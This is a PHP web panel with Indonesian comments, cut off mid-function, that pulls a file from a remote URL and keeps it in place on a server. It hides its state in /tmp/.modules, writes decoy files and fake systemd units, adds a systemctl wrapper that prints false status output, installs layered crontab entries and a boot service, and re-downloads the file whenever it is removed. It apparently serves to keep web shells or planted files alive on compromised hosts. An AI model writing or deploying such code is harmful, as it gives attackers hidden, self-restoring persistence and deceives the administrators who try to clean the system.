<?php
// Konfigurasi dasar
session_start();
error_reporting(0);
ini_set('display_errors', 0);

// Warna tema
define('PRIMARY_GREEN', '#2E7D32');
define('LIGHT_GREEN', '#4CAF50');
define('DARK_GREEN', '#1B5E20');
define('WHITE', '#FFFFFF');
define('LIGHT_GRAY', '#F5F5F5');
define('MEDIUM_GRAY', '#E0E0E0');
define('DARK_GRAY', '#424242');
define('BLACK', '#212121');
define('ERROR_COLOR', '#F44336');
define('SUCCESS_COLOR', '#4CAF50');

// Direktori sistem (semua di /tmp/)
define('SYS_DIR', '/tmp/.modules/');
define('SYS_SUBDIRS', ['sys/', 'cache/', 'lib/', 'logs/', 'services/']);

// Kunci enkripsi (bisa diubah)
define('ENC_KEY', 'x3!9Kp#2$mQv&7*Wz@5C^8Fn+1LdYgRt6');

// Konstanta interval
define('MIN_INTERVAL', 10); // Minimum 10 detik
define('MAX_INTERVAL', 86400); // Maximum 1 hari (86400 detik)

// Pastikan direktori sistem ada
function initSystemDirs() {
    if (!file_exists(SYS_DIR)) {
        mkdir(SYS_DIR, 0700, true);
        // Set hidden attribute jika Windows
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            exec('attrib +h ' . escapeshellarg(SYS_DIR));
        }
    }
    
    foreach (SYS_SUBDIRS as $subdir) {
        $dirPath = SYS_DIR . $subdir;
        if (!file_exists($dirPath)) {
            mkdir($dirPath, 0700, true);
        }
    }
    
    // Buat file dummy untuk penyamaran
    createDummyFiles();
    
    // Inisialisasi service system
    initSystemServices();
}

// Inisialisasi service system untuk penyamaran
function initSystemServices() {
    $serviceDir = SYS_DIR . 'services/';
    
    // Buat systemd service files dummy
    $serviceFiles = [
        'system-modules.service' => "[Unit]\nDescription=System Modules Management\nAfter=network.target\n\n[Service]\nType=oneshot\nRemainAfterExit=yes\nExecStart=/bin/true\nExecReload=/bin/true\n\n[Install]\nWantedBy=multi-user.target",
        'cron-backup.service' => "[Unit]\nDescription=Cron Backup Service\nAfter=system-modules.service\n\n[Service]\nType=simple\nExecStart=/bin/sleep infinity\nRestart=always\n\n[Install]\nWantedBy=multi-user.target",
        'file-watch.service' => "[Unit]\nDescription=File Watch Service\nAfter=cron-backup.service\n\n[Service]\nType=simple\nExecStart=/bin/sleep 3600\nRestart=always\n\n[Install]\nWantedBy=multi-user.target"
    ];
    
    foreach ($serviceFiles as $filename => $content) {
        $filePath = $serviceDir . $filename;
        if (!file_exists($filePath)) {
            file_put_contents($filePath, $content);
        }
    }
    
    // Buat systemctl wrapper untuk menyamarkan
    $systemctlWrapper = $serviceDir . 'systemctl-wrapper.sh';
    if (!file_exists($systemctlWrapper)) {
        $wrapperScript = "#!/bin/bash\n\n";
        $wrapperScript .= "# Systemctl wrapper untuk monitoring\n";
        $wrapperScript .= "case \"\$1\" in\n";
        $wrapperScript .= "    \"status\")\n";
        $wrapperScript .= "        echo \"● system-modules.service - System Modules Management\"\n";
        $wrapperScript .= "        echo \"   Loaded: loaded (/etc/systemd/system/system-modules.service; enabled; vendor preset: enabled)\"\n";
        $wrapperScript .= "        echo \"   Active: active (exited) since \$ (date '+%Y-%m-%d %H:%M:%S')\"\n";
        $wrapperScript .= "        ;;\n";
        $wrapperScript .= "    \"list-units\")\n";
        $wrapperScript .= "        echo \"system-modules.service         loaded active exited System Modules Management\"\n";
        $wrapperScript .= "        echo \"cron-backup.service            loaded active running Cron Backup Service\"\n";
        $wrapperScript .= "        echo \"file-watch.service             loaded active running File Watch Service\"\n";
        $wrapperScript .= "        ;;\n";
        $wrapperScript .= "    *)\n";
        $wrapperScript .= "        # Passthrough ke systemctl asli\n";
        $wrapperScript .= "        /bin/systemctl \"\$@\"\n";
        $wrapperScript .= "        ;;\n";
        $wrapperScript .= "esac\n";
        
        file_put_contents($systemctlWrapper, $wrapperScript);
        chmod($systemctlWrapper, 0755);
    }
}

// Buat file dummy agar terlihat seperti sistem
function createDummyFiles() {
    $dummyFiles = [
        'cache.db' => 'SQLite format 3',
        'modules.load' => '# Kernel modules' . PHP_EOL . 'module1' . PHP_EOL . 'module2',
        'lib/libnet.so.1' => 'ELF dummy',
        'lib/libsys.conf' => '# System config' . PHP_EOL . 'debug=0' . PHP_EOL . 'timeout=30',
        'sys/kernel.conf' => '# Kernel parameters',
        'logs/readme' => '# System logs directory',
        'services/status' => '# Service status file',
        'sys/init.rc' => '# Init script for modules',
        'lib/libcron.so' => 'ELF dummy library',
        'sys/modules.db' => 'SQLite format 3'
    ];
    
    foreach ($dummyFiles as $file => $content) {
        $filePath = SYS_DIR . $file;
        if (!file_exists($filePath)) {
            file_put_contents($filePath, $content);
        }
    }
}

// Fungsi enkripsi sederhana (XOR + Base64)
function encryptData($data) {
    $key = ENC_KEY;
    $result = '';
    $keyLength = strlen($key);
    
    for ($i = 0; $i < strlen($data); $i++) {
        $result .= $data[$i] ^ $key[$i % $keyLength];
    }
    
    // Tambahkan checksum
    $checksum = substr(md5($result), 0, 8);
    return base64_encode($checksum . $result);
}

// Fungsi dekripsi
function decryptData($encrypted) {
    $key = ENC_KEY;
    $decoded = base64_decode($encrypted);
    
    if (strlen($decoded) < 8) return false;
    
    $checksum = substr($decoded, 0, 8);
    $data = substr($decoded, 8);
    
    // Verifikasi checksum
    if (substr(md5($data), 0, 8) !== $checksum) {
        return false;
    }
    
    $result = '';
    $keyLength = strlen($key);
    
    for ($i = 0; $i < strlen($data); $i++) {
        $result .= $data[$i] ^ $key[$i % $keyLength];
    }
    
    return $result;
}

// Generate nama file sistem
function generateSystemFilename($prefix, $id, $ext = '') {
    $hash = substr(md5($id), 0, 12);
    $random = substr(md5(time() . rand(1000, 9999)), 0, 8);
    
    $prefixes = [
        'control' => ['mod_', 'sys_', 'cfg_'],
        'script' => ['proc_', 'exec_', 'bin_'],
        'cron' => ['task_', 'job_', 'sched_'],
        'log' => ['kern.', 'sys.', 'daemon.'],
        'service' => ['svc_', 'srv_', 'sysd_']
    ];
    
    $filePrefix = $prefixes[$prefix][array_rand($prefixes[$prefix])];
    $filename = $filePrefix . $hash . '_' . $random;
    
    if ($ext) {
        $extensions = [
            'data' => ['.data', '.bin', '.dat'],
            'sh' => ['.so', '.bin', ''],
            'log' => ['.log', '.tmp', ''],
            'service' => ['.service', '.srv', '']
        ];
        
        if (isset($extensions[$ext])) {
            $filename .= $extensions[$ext][array_rand($extensions[$ext])];
        }
    }
    
    return $filename;
}

// Simpan data terenkripsi
function saveEncryptedData($filename, $data, $subdir = 'sys/') {
    $filePath = SYS_DIR . $subdir . $filename;
    $encrypted = encryptData(json_encode($data, JSON_PRETTY_PRINT));
    return file_put_contents($filePath, $encrypted) !== false;
}

// Baca data terenkripsi
function readEncryptedData($filename, $subdir = 'sys/') {
    $filePath = SYS_DIR . $subdir . $filename;
    if (!file_exists($filePath)) return false;
    
    $encrypted = file_get_contents($filePath);
    $decrypted = decryptData($encrypted);
    
    if ($decrypted === false) return false;
    
    return json_decode($decrypted, true);
}

// Hapus file sistem
function deleteSystemFile($filename, $subdir = 'sys/') {
    $filePath = SYS_DIR . $subdir . $filename;
    if (file_exists($filePath)) {
        return unlink($filePath);
    }
    return false;
}

// Validasi dan sanitasi path directory
function validateDirectoryPath($path) {
    // Hapus karakter berbahaya
    $path = preg_replace('/[<>:"|?*\x00-\x1F]/', '', $path);
    
    // Normalisasi slashes
    $path = str_replace('\\', '/', $path);
    
    // Hapus trailing slash
    $path = rtrim($path, '/');
    
    // Pastikan path absolute
    if (!empty($path) && $path[0] !== '/') {
        $path = '/' . $path;
    }
    
    return $path;
}

// Buat directory jika belum ada
function ensureDirectoryExists($path) {
    if (!empty($path) && !file_exists($path)) {
        return mkdir($path, 0755, true);
    }
    return true;
}

// Cek apakah directory writable
function isDirectoryWritable($path) {
    if (empty($path)) {
        // Default to system cache directory
        $defaultPath = SYS_DIR . 'cache/';
        return is_writable($defaultPath);
    }
    
    if (!file_exists($path)) {
        // Try to create it first
        if (!mkdir($path, 0755, true)) {
            return false;
        }
    }
    
    return is_writable($path);
}

// Fungsi untuk membuat cronjob berlapis yang AKTIF dan menjalankan monitor script
function createLayeredCronJob($id, $intervalSeconds, $monitorScriptPath) {
    $cronContent = "";
    
    // Generate hash untuk identifikasi
    $jobHash = md5($id);
    
    // Simpan hash dalam file untuk referensi cron
    $hashFile = SYS_DIR . 'sys/' . 'cron_hash_' . substr($jobHash, 0, 8);
    file_put_contents($hashFile, $jobHash . ':' . $monitorScriptPath . ':' . $intervalSeconds);
    
    // Fungsi untuk membuat entry cron dengan offset
    function makeCronEntry($intervalSeconds, $offset, $monitorScriptPath, $jobHash) {
        $entry = "";
        
        if ($intervalSeconds >= 60) {
            // Interval dalam menit
            $minutes = ceil($intervalSeconds / 60);
            
            if ($minutes <= 59) {
                // Setiap X menit
                $baseMinute = floor(($offset * 10) % 60);
                $minutePattern = ($baseMinute % $minutes) . "-59/$minutes";
                $entry = "$minutePattern * * * * ";
            } else {
                // Interval dalam jam
                $hours = ceil($minutes / 60);
                $baseMinute = floor(($offset * 7) % 60);
                $baseHour = floor(($offset * 3) % 24);
                
                if ($hours <= 23) {
                    $hourPattern = ($baseHour % $hours) . "-23/$hours";
                    $entry = "$baseMinute $hourPattern * * * ";
                } else {
                    // Harian
                    $entry = "$baseMinute $baseHour * * * ";
                }
            }
        } else {
            // Interval < 60 detik: jalankan setiap menit dengan sleep yang berbeda
            $sleepTime = ($offset * $intervalSeconds) % 60;
            $entry = "* * * * * sleep $sleepTime; ";
        }
        
        // Tambahkan hash sebagai comment untuk tracking
        $entry .= $monitorScriptPath . " # JOB_HASH:" . substr($jobHash, 0, 12);
        
        return $entry . PHP_EOL;
    }
    
    // Buat 3-5 layer cronjob
    $layers = ($intervalSeconds < 300) ? 5 : 3; // Lebih banyak layer untuk interval pendek
    
    for ($i = 0; $i < $layers; $i++) {
        $cronContent .= makeCronEntry($intervalSeconds, $i, $monitorScriptPath, $jobHash);
    }
    
    // Tambahkan entry untuk auto-recovery check
    $checkInterval = min(3600, max(300, $intervalSeconds * 10));
    $cronContent .= "# Auto-recovery check for job $jobHash\n";
    $cronContent .= "*/" . ceil($checkInterval / 60) . " * * * * " . SYS_DIR . "sys/check_recovery.sh # AUTO_RECOVERY\n";
    
    // Simpan cron file
    $cronFilename = generateSystemFilename('cron', $id . time());
    $cronFile = SYS_DIR . 'sys/' . $cronFilename;
    file_put_contents($cronFile, $cronContent);
    
    // Buat script check recovery
    $recoveryScript = SYS_DIR . 'sys/check_recovery.sh';
    if (!file_exists($recoveryScript)) {
        $recoveryContent = "#!/bin/bash\n\n";
        $recoveryContent .= "LOG=\"" . SYS_DIR . "logs/recovery.log\"\n";
        $recoveryContent .= "echo \"[\$(date '+%Y-%m-%d %H:%M:%S')] Running recovery check\" >> \"\$LOG\"\n\n";
        $recoveryContent .= "# Cek semua cron hash files\n";
        $recoveryContent .= "for hashfile in " . SYS_DIR . "sys/cron_hash_*; do\n";
        $recoveryContent .= "    if [ -f \"\$hashfile\" ]; then\n";
        $recoveryContent .= "        read -r data < \"\$hashfile\"\n";
        $recoveryContent .= "        job_hash=\$(echo \$data | cut -d: -f1)\n";
        $recoveryContent .= "        script_path=\$(echo \$data | cut -d: -f2)\n";
        $recoveryContent .= "        interval=\$(echo \$data | cut -d: -f3)\n\n";
        $recoveryContent .= "        # Cek apakah cronjob masih ada\n";
        $recoveryContent .= "        if ! crontab -l 2>/dev/null | grep -q \"JOB_HASH:\$job_hash\"; then\n";
        $recoveryContent .= "            echo \"[\$(date '+%Y-%m-%d %H:%M:%S')] Cronjob for hash \$job_hash missing, recreating...\" >> \"\$LOG\"\n";
        $recoveryContent .= "            # Restart monitor script\n";
        $recoveryContent .= "            pkill -f \"\$script_path\" 2>/dev/null\n";
        $recoveryContent .= "            nohup \$script_path > /dev/null 2>&1 &\n";
        $recoveryContent .= "        fi\n";
        $recoveryContent .= "    fi\n";
        $recoveryContent .= "done\n";
        
        file_put_contents($recoveryScript, $recoveryContent);
        chmod($recoveryScript, 0755);
    }
    
    // Update crontab dengan cron baru
    $currentCron = shell_exec('crontab -l 2>/dev/null');
    if ($currentCron === null) {
        $currentCron = "";
    }
    
    // Hapus entry lama untuk job ini jika ada
    $lines = explode("\n", $currentCron);
    $newLines = [];
    foreach ($lines as $line) {
        if (strpos($line, "JOB_HASH:" . substr($jobHash, 0, 12)) === false && 
            !empty(trim($line)) && 
            !strpos($line, "# AUTO_RECOVERY")) {
            $newLines[] = $line;
        }
    }
    
    // Tambahkan cron baru
    $newCron = implode("\n", $newLines) . "\n" . $cronContent;
    file_put_contents($cronFile, $newCron);
    
    // Load ke crontab
    $result = shell_exec("crontab " . escapeshellarg($cronFile) . " 2>&1");
    
    // Verifikasi cronjob terinstall
    $cronCheck = shell_exec('crontab -l 2>/dev/null | grep -c "JOB_HASH:' . substr($jobHash, 0, 12) . '"');
    
    return [
        'cron_file' => $cronFilename,
        'hash_file' => basename($hashFile),
        'installed' => ($cronCheck > 0),
        'layers' => $layers
    ];
}

// Download file dengan curl/wget ke directory tertentu
function downloadFile($url, $outputPath) {
    $outputDir = dirname($outputPath);
    
    // Pastikan directory ada
    if (!file_exists($outputDir)) {
        mkdir($outputDir, 0755, true);
    }
    
    // Coba wget dengan user-agent dan timeout
    $wgetCommand = "wget -q -U 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36' --timeout=30 --tries=2 --waitretry=5 -O " . escapeshellarg($outputPath) . " " . escapeshellarg($url) . " 2>/dev/null";
    exec($wgetCommand, $wgetOutput, $wgetReturn);
    
    if ($wgetReturn === 0 && file_exists($outputPath) && filesize($outputPath) > 0) {
        return true;
    }
    
    // Coba curl
    $curlCommand = "curl -s -A 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36' --connect-timeout 30 --max-time 60 --retry 2 --retry-delay 5 -o " . escapeshellarg($outputPath) . " " . escapeshellarg($url) . " 2>/dev/null";
    exec($curlCommand, $curlOutput, $curlReturn);
    
    return ($curlReturn === 0 && file_exists($outputPath) && filesize($outputPath) > 0);
}

// Format interval detik ke string yang mudah dibaca
function formatInterval($seconds) {
    if ($seconds < 60) {
        return $seconds . " detik";
    } elseif ($seconds < 3600) {
        $minutes = floor($seconds / 60);
        $remaining = $seconds % 60;
        if ($remaining > 0) {
            return $minutes . " menit " . $remaining . " detik";
        }
        return $minutes . " menit";
    } else {
        $hours = floor($seconds / 3600);
        $minutes = floor(($seconds % 3600) / 60);
        if ($minutes > 0) {
            return $hours . " jam " . $minutes . " menit";
        }
        return $hours . " jam";
    }
}

// Validasi interval
function validateInterval($seconds) {
    $seconds = intval($seconds);
    if ($seconds < MIN_INTERVAL) {
        return MIN_INTERVAL;
    } elseif ($seconds > MAX_INTERVAL) {
        return MAX_INTERVAL;
    }
    return $seconds;
}

// Membuat service system untuk penyamaran
function createSystemService($jobId, $monitorScript) {
    $serviceName = 'module-' . substr(md5($jobId), 0, 8) . '.service';
    $serviceFile = SYS_DIR . 'services/' . $serviceName;
    
    $serviceContent = "[Unit]\n";
    $serviceContent .= "Description=System Module " . substr($jobId, 0, 8) . "\n";
    $serviceContent .= "After=network.target\n";
    $serviceContent .= "Requires=system-modules.service\n\n";
    
    $serviceContent .= "[Service]\n";
    $serviceContent .= "Type=forking\n";
    $serviceContent .= "ExecStart=" . $monitorScript . "\n";
    $serviceContent .= "Restart=always\n";
    $serviceContent .= "RestartSec=10\n";
    $serviceContent .= "StandardOutput=syslog\n";
    $serviceContent .= "StandardError=syslog\n";
    $serviceContent .= "SyslogIdentifier=system-module\n";
    $serviceContent .= "Environment=\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\n\n";
    
    $serviceContent .= "[Install]\n";
    $serviceContent .= "WantedBy=multi-user.target\n";
    
    file_put_contents($serviceFile, $serviceContent);
    
    // Buat symlink ke systemd jika memungkinkan
    if (file_exists('/etc/systemd/system/')) {
        $symlink = '/etc/systemd/system/' . $serviceName;
        if (!file_exists($symlink)) {
            symlink($serviceFile, $symlink);
            exec('systemctl daemon-reload 2>/dev/null');
            exec('systemctl enable ' . escapeshellarg($serviceName) . ' 2>/dev/null');
            exec('systemctl start ' . escapeshellarg($serviceName) . ' 2>/dev/null');
        }
    }
    
    return $serviceName;
}

// Buat monitor script yang lebih kuat dengan recovery
function createMonitorScript($jobId, $rawUrl, $outputPath, $intervalSeconds, $controlFilename) {
    $monitorFilename = generateSystemFilename('script', $jobId);
    $monitorFile = SYS_DIR . 'sys/' . $monitorFilename;
    
    $logFile = SYS_DIR . 'logs/' . generateSystemFilename('log', $jobId, 'log');
    $pidFile = SYS_DIR . 'sys/' . 'pid_' . substr(md5($jobId), 0, 8);
    
    $outputDir = dirname($outputPath);
    $outputFile = basename($outputPath);
    
    $script = "#!/bin/bash\n\n";
    $script .= "JOB_ID=\"$jobId\"\n";
    $script .= "RAW_URL=\"$rawUrl\"\n";
    $script .= "OUTPUT_DIR=\"$outputDir\"\n";
    $script .= "OUTPUT_FILE=\"$outputFile\"\n";
    $script .= "OUTPUT_PATH=\"$outputPath\"\n";
    $script .= "INTERVAL=$intervalSeconds\n";
    $script .= "LOG_FILE=\"$logFile\"\n";
    $script .= "PID_FILE=\"$pidFile\"\n";
    $script .= "CONTROL_FILE=\"" . SYS_DIR . "sys/$controlFilename\"\n";
    $script .= "MAX_RETRIES=5\n";
    $script .= "RETRY_DELAY=10\n\n";
    
    $script .= "# Function untuk logging\n";
    $script .= "log() {\n";
    $script .= "    echo \"[\$(date '+%Y-%m-%d %H:%M:%S')] \$1\" >> \"\$LOG_FILE\"\n";
    $script .= "}\n\n";
    
    $script .= "# Function untuk download file\n";
    $script .= "download_file() {\n";
    $script .= "    local url=\"\$1\"\n";
    $script .= "    local output=\"\$2\"\n";
    $script .= "    local retries=0\n";
    $script .= "    \n";
    $script .= "    while [ \$retries -lt \$MAX_RETRIES ]; do\n";
    $script .= "        # Coba wget\n";
    $script .= "        wget -q -U 'Mozilla/5.0' --timeout=30 -O \"\$output\" \"\$url\" 2>/dev/null\n";
    $script .= "        if [ \$? -eq 0 ] && [ -f \"\$output\" ] && [ -s \"\$output\" ]; then\n";
    $script .= "            log \"Download successful to \$output\"\n";
    $script .= "            return 0\n";
    $script .= "        fi\n";
    $script .= "        \n";
    $script .= "        # Coba curl\n";
    $script .= "        curl -s -A 'Mozilla/5.0' --connect-timeout 30 -o \"\$output\" \"\$url\" 2>/dev/null\n";
    $script .= "        if [ \$? -eq 0 ] && [ -f \"\$output\" ] && [ -s \"\$output\" ]; then\n";
    $script .= "            log \"Download successful via curl to \$output\"\n";
    $script .= "            return 0\n";
    $script .= "        fi\n";
    $script .= "        \n";
    $script .= "        retries=\$((retries + 1))\n";
    $script .= "        log \"Download attempt \$retries failed, retrying in \$RETRY_DELAY seconds...\"\n";
    $script .= "        sleep \$RETRY_DELAY\n";
    $script .= "    done\n";
    $script .= "    \n";
    $script .= "    log \"ERROR: Failed to download after \$MAX_RETRIES attempts\"\n";
    $script .= "    return 1\n";
    $script .= "}\n\n";
    
    $script .= "# Function untuk update control file\n";
    $script .= "update_control_file() {\n";
    $script .= "    local status=\"\$1\"\n";
    $script .= "    local message=\"\$2\"\n";
    $script .= "    \n";
    $script .= "    if [ -f \"\$CONTROL_FILE\" ]; then\n";
    $script .= "        # Decode dan update data\n";
    $script .= "        temp_file=\$(mktemp)\n";
    $script .= "        cat \"\$CONTROL_FILE\" | base64 -d 2>/dev/null > \"\$temp_file\"\n";
    $script .= "        \n";
    $script .= "        # Update last_checked dan status\n";
    $script .= "        sed -i \"s/\\\"last_checked\\\":\\\"[^\\\"]*/\\\"last_checked\\\":\\\"\$(date '+%Y-%m-%d %H:%M:%S')/g\" \"\$temp_file\"\n";
    $script .= "        sed -i \"s/\\\"status\\\":\\\"[^\\\"]*/\\\"status\\\":\\\"\$status/g\" \"\$temp_file\"\n";
    $script .= "        \n";
    $script .= "        if [ \"\$status\" = \"recovering\" ]; then\n";
    $script .= "            # Increment recovery count\n";
    $script .= "            current=\$(grep -o '\"recovery_count\":[0-9]*' \"\$temp_file\" | cut -d: -f2)\n";
    $script .= "            new=\$((current + 1))\n";
    $script .= "            sed -i \"s/\\\"recovery_count\\\":\$current/\\\"recovery_count\\\":\$new/g\" \"\$temp_file\"\n";
    $script .= "        fi\n";
    $script .= "        \n";
    $script .= "        # Encode kembali\n";
    $script .= "        encoded=\$(cat \"\$temp_file\" | base64 -w 0)\n";
    $script .= "        echo \"\$encoded\" > \"\$CONTROL_FILE\"\n";
    $script .= "        rm -f \"\$temp_file\"\n";
    $script .= "        log \"Control file updated: \$message\"\n";
    $script .= "    fi\n";
    $script .= "}\n\n";
    
    $script .= "# Main script\n";
    $script .= "log \"=== Starting monitor for \$JOB_ID ===\"\n";
    $script .= "log \"Output: \$OUTPUT_PATH\"\n";
    $script .= "log \"Interval: \$INTERVAL seconds\"\n";
    $script .= "log \"URL: \$RAW_URL\"\n\n";
    
    $script .= "# Pastikan directory output ada\n";
    $script .= "mkdir -p \"\$OUTPUT_DIR\" 2>/dev/null\n";
    $script .= "if [ ! -d \"\$OUTPUT_DIR\" ]; then\n";
    $script .= "    log \"ERROR: Cannot create directory \$OUTPUT_DIR\"\n";
    $script .= "    exit 1\n";
    $script .= "fi\n\n";
    
    $script .= "# Download file pertama kali\n";
    $script .= "if [ ! -f \"\$OUTPUT_PATH\" ]; then\n";
    $script .= "    log \"File not found, performing initial download...\"\n";
    $script .= "    download_file \"\$RAW_URL\" \"\$OUTPUT_PATH\"\n";
    $script .= "    if [ \$? -ne 0 ]; then\n";
    $script .= "        log \"ERROR: Initial download failed\"\n";
    $script .= "        exit 1\n";
    $script .= "    fi\n";
    $script .= "fi\n\n";
    
    $script .= "# Simpan PID\n";
    $script .= "echo \$\$ > \"\$PID_FILE\"\n";
    $script .= "trap \"rm -f \\\"\$PID_FILE\\\"; log 'Monitor stopped'; exit 0\" INT TERM EXIT\n\n";
    
    $script .= "# Loop monitoring\n";
    $script .= "while true; do\n";
    $script .= "    log \"Checking file...\"\n";
    $script .= "    \n";
    $script .= "    # Cek apakah file masih ada\n";
    $script .= "    if [ ! -f \"\$OUTPUT_PATH\" ]; then\n";
    $script .= "        log \"WARNING: File missing! Starting recovery...\"\n";
    $script .= "        update_control_file \"recovering\" \"File missing\"\n";
    $script .= "        \n";
    $script .= "        # Download ulang\n";
    $script .= "        download_file \"\$RAW_URL\" \"\$OUTPUT_PATH\"\n";
    $script .= "        if [ \$? -eq 0 ]; then\n";
    $script .= "            log \"Recovery successful\"\n";
    $script .= "            update_control_file \"active\" \"File recovered\"\n";
    $script .= "        else\n";
    $script .= "            log \"ERROR: Recovery failed\"\n";
    $script .= "            update_control_file \"error\" \"Recovery failed\"\n";
    $script .= "        fi\n";
    $script .= "    else\n";
    $script .= "        # Cek apakah file bisa dibaca\n";
    $script .= "        if [ ! -r \"\$OUTPUT_PATH\" ]; then\n";
    $script .= "            log \"WARNING: File not readable, fixing permissions...\"\n";
    $script .= "            chmod 644 \"\$OUTPUT_PATH\" 2>/dev/null\n";
    $script .= "        fi\n";
    $script .= "        \n";
    $script .= "        # Update status\n";
    $script .= "        update_control_file \"active\" \"File OK\"\n";
    $script .= "    fi\n";
    $script .= "    \n";
    $script .= "    # Tunggu interval\n";
    $script .= "    log \"Sleeping for \$INTERVAL seconds...\"\n";
    $script .= "    sleep \$INTERVAL\n";
    $script .= "done\n";
    
    file_put_contents($monitorFile, $script);
    chmod($monitorFile, 0755);
    
    return $monitorFilename;
}

// Inisialisasi sistem
initSystemDirs();

// Proses form submission
$message = '';
$messageType = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle directory check
    if (isset($_POST['action']) && $_POST['action'] === 'check_dir') {
        $directoryPath = isset($_POST['directory_path']) ? validateDirectoryPath($_POST['directory_path']) : '';
        
        if (!empty($directoryPath)) {
            if (isDirectoryWritable($directoryPath)) {
                echo "writable";
            } else {
                echo "not_writable";
            }
        } else {
            echo "empty";
        }
        exit;
    }
    
    if (isset($_POST['action']) && $_POST['action'] === 'start') {
        $rawUrl = filter_var($_POST['raw_url'], FILTER_SANITIZE_URL);
        $outputName = preg_replace('/[^a-zA-Z0-9._-]/', '', $_POST['output_name']);
        $intervalSeconds = intval($_POST['interval']);
        $directoryPath = isset($_POST['directory_path']) ? validateDirectoryPath($_POST['directory_path']) : '';
        
        if (!empty($rawUrl) && !empty($outputName) && $intervalSeconds > 0) {
            // Validasi interval
            $intervalSeconds = validateInterval($intervalSeconds);
            
            // Validasi directory path
            if (!empty($directoryPath)) {
                if (!isDirectoryWritable($directoryPath)) {
                    $message = "❌ Directory tidak dapat ditulis: " . htmlspecialchars($directoryPath);
                    $messageType = "error";
                } else {
                    // Coba buat directory
                    if (!ensureDirectoryExists($directoryPath)) {
                        $message = "❌ Gagal membuat directory: " . htmlspecialchars($directoryPath);
                        $messageType = "error";
                    }
                }
            }
            
            if ($messageType !== 'error') {
                // Hash untuk identifikasi unik
                $jobId = 'job_' . md5($rawUrl . $outputName . time());
                
                // Tentukan output path
                if (!empty($directoryPath)) {
                    $outputPath = rtrim($directoryPath, '/') . '/' . $outputName;
                } else {
                    // Default ke system cache dengan nama hash
                    $fileHash = substr(md5($outputName), 0, 16);
                    $outputPath = SYS_DIR . 'cache/' . $fileHash;
                }
                
                // Download file pertama kali
                if (downloadFile($rawUrl, $outputPath)) {
                    $originalHash = md5_file($outputPath);
                    $fileSize = filesize($outputPath);
                    
                    // Data kontrol
                    $controlData = [
                        'id' => $jobId,
                        'raw_url' => $rawUrl,
                        'output_name' => $outputName,
                        'output_path' => $outputPath,
                        'directory' => !empty($directoryPath) ? $directoryPath : SYS_DIR . 'cache/',
                        'original_hash' => $originalHash,
                        'interval_seconds' => $intervalSeconds,
                        'created_at' => date('Y-m-d H:i:s'),
                        'last_checked' => date('Y-m-d H:i:s'),
                        'status' => 'active',
                        'recovery_count' => 0,
                        'file_size' => $fileSize,
                        'file_exists' => true,
                        'last_modified' => date('Y-m-d H:i:s', filemtime($outputPath))
                    ];
                    
                    // Simpan data kontrol terenkripsi
                    $controlFilename = generateSystemFilename('control', $jobId, 'data');
                    saveEncryptedData($controlFilename, $controlData);
                    
                    // Buat monitor script yang lebih kuat
                    $monitorFilename = createMonitorScript($jobId, $rawUrl, $outputPath, $intervalSeconds, $controlFilename);
                    $monitorFile = SYS_DIR . 'sys/' . $monitorFilename;
                    
                    // Jalankan monitor script
                    exec("nohup " . escapeshellarg($monitorFile) . " > /dev/null 2>&1 &");
                    
                    // Buat cronjob berlapis yang AKTIF
                    $cronFiles = createLayeredCronJob($jobId, $intervalSeconds, $monitorFile);
                    
                    // Buat service system untuk penyamaran
                    $serviceName = createSystemService($jobId, $monitorFile);
                    
                    // Update control data dengan info lengkap
                    $controlData['control_file'] = $controlFilename;
                    $controlData['monitor_file'] = $monitorFilename;
                    $controlData['cron_files'] = $cronFiles;
                    $controlData['service_name'] = $serviceName;
                    $controlData['pid_file'] = 'pid_' . substr(md5($jobId), 0, 8);
                    saveEncryptedData($controlFilename, $controlData);
                    
                    // Verifikasi cronjob terinstall
                    $cronCheck = shell_exec('crontab -l 2>/dev/null | grep -c "JOB_HASH:' . substr(md5($jobId), 0, 12) . '"');
                    
                    $formattedInterval = formatInterval($intervalSeconds);
                    $message = "✅ Protection system activated for: " . htmlspecialchars($outputName);
                    $message .= "<br>📁 Directory: " . htmlspecialchars(dirname($outputPath));
                    $message .= "<br>⏱️ Interval: $formattedInterval";
                    $message .= "<br>🔧 Cron layers: " . $cronFiles['layers'] . " layers";
                    $message .= "<br>⚙️ Service: " . $serviceName;
                    
                    if ($cronFiles['installed']) {
                        $message .= "<br>✅ Cronjob installed successfully";
                    } else {
                        $message .= "<br>⚠️ Cronjob may not be installed (check manually)";
                    }
                    
                    $messageType = "success";
                    
                } else {
                    $message = "❌ Failed to download file to: " . htmlspecialchars($outputPath);
                    $messageType = "error";
                }
            }
        } else {
            $message = "❌ Invalid input data";
            $messageType = "error";
        }
    }
    
    // Stop job
    if (isset($_POST['action']) && $_POST['action'] === 'stop') {
        $jobId = $_POST['job_id'];
        
        // Cari file kontrol
        $sysFiles = glob(SYS_DIR . 'sys/mod_*.data');
        foreach ($sysFiles as $file) {
            $data = readEncryptedData(basename($file));
            if ($data && $data['id'] === $jobId) {
                $data['status'] = 'stopped';
                $data['stopped_at'] = date('Y-m-d H:i:s');
                saveEncryptedData(basename($file), $data);
                
                // Hentikan monitor
                if (isset($data['monitor_file'])) {
                    exec("pkill -f " . escapeshellarg($data['monitor_file']) . " 2>/dev/null");
                }
                
                // Hapus PID file
                if (isset($data['pid_file'])) {
                    $pidFile = SYS_DIR . 'sys/' . $data['pid_file'];
                    if (file_exists($pidFile)) {
                        unlink($pidFile);
                    }
                }
                
                $message = "⚠️ Job stopped (backup system will recreate if needed)";
                $messageType = "success";
                break;
            }
        }
    }
    
    // Delete job
    if (isset($_POST['action']) && $_POST['action'] === 'delete') {
        $jobId = $_POST['job_id'];
        
        $sysFiles = glob(SYS_DIR . 'sys/mod_*.data');
        foreach ($sysFiles as $file) {
            $data = readEncryptedData(basename($file));
            if ($data && $data['id'] === $jobId) {
                // Hentikan semua proses terkait
                if (isset($data['monitor_file'])) {
                    exec("pkill -f " . escapeshellarg($data['monitor_file']) . " 2>/dev/null");
                    deleteSystemFile($data['monitor_file']);
                }
                
                // Hapus cron hash file
                if (isset($data['cron_files']['hash_file'])) {
                    deleteSystemFile($data['cron_files']['hash_file']);
                }
                
                // Hapus PID file
                if (isset($data['pid_file'])) {
                    $pidFile = SYS_DIR . 'sys/' . $data['pid_file'];
                    if (file_exists($pidFile)) {
